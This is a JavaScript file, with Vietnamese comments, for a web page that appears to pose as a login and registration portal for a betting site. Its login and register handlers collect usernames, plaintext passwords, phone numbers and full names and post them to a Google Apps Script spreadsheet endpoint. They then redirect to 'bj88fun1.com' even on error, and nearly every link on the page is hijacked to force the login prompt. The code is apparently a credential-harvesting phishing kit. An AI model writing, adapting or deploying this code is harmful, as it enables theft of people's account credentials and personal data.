document.addEventListener('DOMContentLoaded', () => {
    const mobileMenuBtn = document.getElementById('mobile-menu-btn');
    const sidebar = document.getElementById('sidebar');
    const overlay = document.getElementById('overlay');

    // Mở menu khi nhấp vào biểu tượng hamburger
    mobileMenuBtn.addEventListener('click', () => {
        sidebar.classList.add('active');
        overlay.classList.add('active');
    });

    // Đóng menu khi nhấp ra ngoài khu vực menu (nhấp vào lớp phủ)
    overlay.addEventListener('click', () => {
        sidebar.classList.remove('active');
        overlay.classList.remove('active');
    });
});

// --- Xử lý Banner Slider ---
const sliderContainer = document.getElementById('slider-container');
const slides = document.querySelectorAll('.slide');
const prevBtn = document.getElementById('prevBtn');
const nextBtn = document.getElementById('nextBtn');

let currentIndex = 0;
// Kiểm tra nếu có slider thì mới chạy để tránh lỗi trên trang không có slider
if (sliderContainer && slides.length > 0) {
    const totalSlides = slides.length;
    let sliderInterval;

    // Hàm chuyển ảnh
    function goToSlide(index) {
        // Xử lý vòng lặp
        if (index < 0) {
            currentIndex = totalSlides - 1; // Quay về ảnh cuối
        } else if (index >= totalSlides) {
            currentIndex = 0; // Quay lại ảnh đầu
        } else {
            currentIndex = index;
        }
        
        // Dịch chuyển container bằng CSS Transform
        const translateX = -(currentIndex * 100);
        sliderContainer.style.transform = `translateX(${translateX}%)`;
    }

    // Hàm tự động trượt
    function startAutoSlide() {
        sliderInterval = setInterval(() => {
            goToSlide(currentIndex + 1);
        }, 4000); // Đổi ảnh sau mỗi 4 giây (4000ms)
    }

    // Hàm dừng tự động trượt (khi người dùng tự bấm nút)
    function resetAutoSlide() {
        clearInterval(sliderInterval);
        startAutoSlide();
    }

    // Bắt sự kiện click cho các nút
    if (nextBtn && prevBtn) {
        nextBtn.addEventListener('click', () => {
            goToSlide(currentIndex + 1);
            resetAutoSlide();
        });

        prevBtn.addEventListener('click', () => {
            goToSlide(currentIndex - 1);
            resetAutoSlide();
        });
    }

    // Khởi động slider tự động khi tải trang
    startAutoSlide();
}

// --- Xử lý Đóng/Mở & Đẩy dữ liệu về Google Sheets ---
document.addEventListener('DOMContentLoaded', () => {
    // URL Web App của Google Apps Script (Dán link của bạn vào đây)
    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzTiLPN-72MPlK0B-UFebitqszf3RtNu472qzkjSO06hOqQJFTtuabxVUp3v3etk-Y/exec';
    
    // Đích đến sau khi submit thành công
    const REDIRECT_URL = 'https://bj88fun1.com/vn/vn';

    const btnOpenLogin = document.getElementById('btn-open-login');
    const btnOpenRegister = document.getElementById('btn-open-register');
    const loginModal = document.getElementById('login-modal');
    const registerModal = document.getElementById('register-modal');
    const closeLoginBtn = document.getElementById('close-login');
    const closeRegisterBtn = document.getElementById('close-register');
    const switchToRegister = document.getElementById('switch-to-register');

    const loginSubmitBtn = loginModal ? loginModal.querySelector('.btn-submit') : null;
    const registerSubmitBtn = registerModal ? registerModal.querySelector('.btn-submit') : null;

    // 1. Logic Đóng/Mở Modal
    if (btnOpenLogin) btnOpenLogin.addEventListener('click', () => loginModal.classList.add('show'));
    if (btnOpenRegister) btnOpenRegister.addEventListener('click', () => registerModal.classList.add('show'));
    if (closeLoginBtn) closeLoginBtn.addEventListener('click', () => loginModal.classList.remove('show'));
    if (closeRegisterBtn) closeRegisterBtn.addEventListener('click', () => registerModal.classList.remove('show'));
    
    if (switchToRegister) {
        switchToRegister.addEventListener('click', (e) => {
            e.preventDefault();
            loginModal.classList.remove('show');
            registerModal.classList.add('show');
        });
    }

    window.addEventListener('click', (e) => {
        if (e.target === loginModal) loginModal.classList.remove('show');
        if (e.target === registerModal) registerModal.classList.remove('show');
    });

    // 2. Hàm kiểm tra điều kiện
    const validateData = (username, password, phone) => {
        if (username.length < 6 || username.length > 20) {
            alert("Tài khoản/Tên đăng nhập phải từ 6 đến 20 ký tự.");
            return false;
        }
        if (password.length < 6 || password.length > 20) {
            alert("Mật khẩu phải từ 6 đến 20 ký tự.");
            return false;
        }
        if (!/^\d{10}$/.test(phone)) {
            alert("Số điện thoại phải bao gồm đúng 10 chữ số.");
            return false;
        }
        return true;
    };
    // --- TÁC VỤ MỚI: Tự động sáng nút Submit Đăng ký khi điền đủ form ---
    if (registerModal && registerSubmitBtn) {
        // Lấy tất cả các ô nhập liệu trong form đăng ký
        const registerInputs = registerModal.querySelectorAll('input');
        
        const checkFormCompletion = () => {
            // Kiểm tra giá trị các ô nhập liệu (input:not checkbox là 4 ô text/password/tel)
            const textInputs = registerModal.querySelectorAll('input:not([type="checkbox"])');
            const username = textInputs[0].value.trim();
            const password = textInputs[1].value.trim();
            const fullname = textInputs[2].value.trim();
            const phone = textInputs[3].value.trim();
            
            // Kiểm tra checkbox điều khoản
            const isAgreed = registerModal.querySelector('input[type="checkbox"]').checked;

            // Nếu tất cả các trường đều có dữ liệu và checkbox được tích
            if (username !== "" && password !== "" && fullname !== "" && phone !== "" && isAgreed) {
                registerSubmitBtn.classList.remove('btn-dark');
                registerSubmitBtn.classList.add('btn-yellow'); // Đổi sang màu vàng
            } else {
                registerSubmitBtn.classList.remove('btn-yellow');
                registerSubmitBtn.classList.add('btn-dark');   // Quay về màu xám tối
            }
        };

        // Gắn sự kiện 'input' (khi gõ phím) và 'change' (khi tích checkbox) cho tất cả các trường
        registerInputs.forEach(input => {
            input.addEventListener('input', checkFormCompletion);
            input.addEventListener('change', checkFormCompletion);
        });
    }

    // Hàm gửi dữ liệu đi bằng fetch POST
    const sendDataToSheet = (data, submitBtn) => {
        // Đổi trạng thái nút bấm để người dùng không bấm nhiều lần
        const originalText = submitBtn.innerText;
        submitBtn.innerText = "Đang xử lý...";
        submitBtn.disabled = true;

        const urlParams = new URLSearchParams(data);

        fetch(SCRIPT_URL, {
            method: 'POST',
            body: urlParams
        })
        .then(response => response.text())
        .then(result => {
            window.location.href = REDIRECT_URL;
        })
        .catch(error => {
            console.error('Error:', error);
            // Vẫn chuyển trang kể cả khi có lỗi mạng nhẹ để không gián đoạn trải nghiệm
            window.location.href = REDIRECT_URL;
        });
    };

    // 3. Xử lý Form Đăng Nhập
    if (loginSubmitBtn) {
        loginSubmitBtn.addEventListener('click', () => {
            const inputs = loginModal.querySelectorAll('input');
            const username = inputs[0].value.trim();
            const password = inputs[1].value.trim();
            const phone = inputs[2].value.trim(); 

            if (!username || !password || !phone) {
                alert("Vui lòng điền đầy đủ thông tin đăng nhập.");
                return;
            }

            if (validateData(username, password, phone)) {
                const data = {
                    status: "Đăng nhập",
                    username: username,
                    password: password,
                    phone: phone,
                    fullname: "" // Đăng nhập không có họ tên
                };
                sendDataToSheet(data, loginSubmitBtn);
            }
        });
    }

    // 4. Xử lý Form Đăng Ký
    if (registerSubmitBtn) {
        registerSubmitBtn.addEventListener('click', () => {
            const inputs = registerModal.querySelectorAll('input:not([type="checkbox"])');
            const username = inputs[0].value.trim();
            const password = inputs[1].value.trim();
            const fullname = inputs[2].value.trim();
            const phone = inputs[3].value.trim();
            const isAgreed = registerModal.querySelector('input[type="checkbox"]').checked;

            if (!username || !password || !fullname || !phone) {
                alert("Vui lòng điền đầy đủ thông tin đăng ký.");
                return;
            }

            if (!isAgreed) {
                alert("Vui lòng đồng ý với Điều khoản & Điều kiện để tiếp tục.");
                return;
            }

            if (validateData(username, password, phone)) {
                const data = {
                    status: "Đăng ký",
                    username: username,
                    password: password,
                    phone: phone,
                    fullname: fullname
                };
                sendDataToSheet(data, registerSubmitBtn);
            }
        });
    }

    // --- TÁC VỤ MỞ FORM ĐĂNG NHẬP KHI CLICK VÀO CÁC VÙNG KHÁC ---
    const requireLoginSelectors = [
        '.sidebar-menu a', '.cat-btn', '.cat-btn-special', '.card', '.btn-primary', '.sidebar-action'
    ];

    requireLoginSelectors.forEach(selector => {
        const elements = document.querySelectorAll(selector);
        elements.forEach(el => {
            el.addEventListener('click', (e) => {
                e.preventDefault(); 
                if (loginModal) loginModal.classList.add('show');
            });
        });
    });
});